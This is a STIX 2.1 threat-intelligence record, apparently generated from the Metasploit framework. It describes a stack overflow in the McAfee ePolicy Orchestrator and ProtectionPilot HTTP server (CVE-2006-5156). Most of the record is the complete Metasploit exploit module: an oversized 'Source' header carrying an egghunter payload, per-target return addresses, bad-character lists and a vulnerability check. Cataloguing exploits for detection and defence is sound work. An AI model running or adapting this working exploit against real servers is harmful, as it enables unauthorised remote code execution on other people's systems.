{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--1dd73701-750d-43b2-955a-6ae7e96463b6",
    "created": "2024-08-14T16:54:32.391538Z",
    "modified": "2024-08-14T16:54:32.391542Z",
    "name": "McAfee ePolicy Orchestrator / ProtectionPilot Overflow",
    "description": " This is an exploit for the McAfee HTTP Server (NAISERV.exe). McAfee ePolicy Orchestrator 2.5.1 <= 3.5.0 and ProtectionPilot 1.1.0 are known to be vulnerable. By sending a large 'Source' header, the stack can be overwritten. This module is based on the exploit by xbxice and muts. Due to size constraints, this module uses the Egghunter technique. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/mcafee_epolicy_source.rb",
            "external_id": "mcafee_epolicy_source.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2006-5156"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = AverageRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::Remote::Egghunter\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'McAfee ePolicy Orchestrator / ProtectionPilot Overflow',\n      'Description'    => %q{\n          This is an exploit for the McAfee HTTP Server (NAISERV.exe).\n        McAfee ePolicy Orchestrator 2.5.1 <= 3.5.0 and ProtectionPilot 1.1.0 are\n        known to be vulnerable. By sending a large 'Source' header, the stack can\n        be overwritten. This module is based on the exploit by xbxice and muts.\n        Due to size constraints, this module uses the Egghunter technique.\n      },\n      'Author'  =>\n        [\n          'muts <muts[at]remote-exploit.org>',\n          'xbxice[at]yahoo.com',\n          'hdm',\n          'aushack' # MSF3 rewrite, ePO v2.5.1 target\n        ],\n      'Arch'\t\t=> [ ARCH_X86 ],\n      'License'\t=> MSF_LICENSE,\n      'References'\t=>\n        [\n          [ 'CVE', '2006-5156' ],\n          [ 'OSVDB', '29421' ],\n          [ 'EDB', '2467' ],\n          [ 'BID', '20288' ],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread',\n        },\n      'Payload'        =>\n        {\n          'Space'    => 1000,\n          'BadChars'  => \"\\x00\\x09\\x0a\\x0b\\x0d\\x20\\x26\\x2b\\x3d\\x25\\x8c\\x3c\\xff\",\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'ePo 2.5.1 (Service Pack 1)',\t\t{ 'Ret' => 0x600741b5 } ], # p/p/r nahttp32.dll 2.5.1.213\n          [ 'ePo 3.5.0/ProtectionPilot 1.1.0',\t{ 'Ret' => 0x601EDBDA } ], # p/p/r xmlutil.dll\n        ],\n      'Privileged'     => true,\n      'DisclosureDate' => '2006-07-17'))\n\n    register_options(\n      [\n        Opt::RPORT(81),\n      ])\n  end\n\n  def check\n    connect\n\n    req = \"GET /SITEINFO.INI HTTP/1.0\\r\\n\"\n    req << \"User-Agent: Mozilla/5.0\\r\\n\\r\\n\"\n    sock.put(req)\n\n    banner = sock.get_once\n\n    if banner.to_s =~ /Spipe\\/1\\.0/\n      return Exploit::CheckCode::Appears\n    end\n    return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    connect\n\n    hunter = generate_egghunter(payload.encoded, payload_badchars, { :checksum => true })\n    egg    = hunter[1]\n\n    sploit  = Rex::Text::rand_text_alphanumeric(92)\n    sploit << Rex::Arch::X86.jmp_short(6)\n    sploit << Rex::Text::rand_text_alphanumeric(2)\n    sploit << [target['Ret']].pack('V')\n    sploit << hunter[0]\n\n    content = egg\n\n    request = \"GET /spipe/pkg HTTP/1.0\\r\\n\"\n    request << \"User-Agent: Mozilla/4.0 (compatible; SPIPE/1.0\\r\\n\"\n    request << \"Content-Length: \" + content.length.to_s + \"\\r\\n\"\n    request << \"AgentGuid=\" + Rex::Text::rand_text_alphanumeric(64) + \"\\r\\n\"\n    request << \"Source=\" + sploit + \"\\r\\n\"\n    request << \"\\r\\n\"\n    request << content\n\n    sock.put(request + \"\\r\\n\\r\\n\")\n\n    disconnect\n    handler\n  end\nend\n",
    "x_mitre_disclosure_date": "2006-07-17",
    "x_mitre_platforms": [
        "win'"
    ]
}